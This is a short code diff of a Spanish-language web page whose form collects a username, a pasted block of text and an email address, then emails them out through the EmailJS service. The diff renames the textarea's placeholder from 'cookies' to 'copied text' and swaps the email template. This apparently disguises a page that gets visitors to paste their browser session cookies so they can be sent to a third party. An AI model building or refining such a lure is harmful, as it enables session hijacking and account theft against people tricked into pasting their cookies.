@@ -67,7 +67,7 @@
     <h1>Información del usuario</h1>
     <form id="formulario">
         <input type="text" id="usuario" placeholder="Usuario" required><br>
-        <textarea id="texto" placeholder="cookies" rows="4" required></textarea><br>
+        <textarea id="texto" placeholder="Texto copiado" rows="4" required></textarea><br>
         <input type="email" id="correo" placeholder="Correo" required><br>
         <button type="button" onclick="enviarFormulario()">Enviar</button>
     </form>
@@ -78,7 +78,7 @@
 
 <script>
 function enviarFormulario() {
-    emailjs.send("service_9xolqhc", "template_des2mfd", {
+    emailjs.send("service_9xolqhc", "template_eogisfu", {
         usuario: document.getElementById("usuario").value,
         texto: document.getElementById("texto").value,
         correo: document.getElementById("correo").value
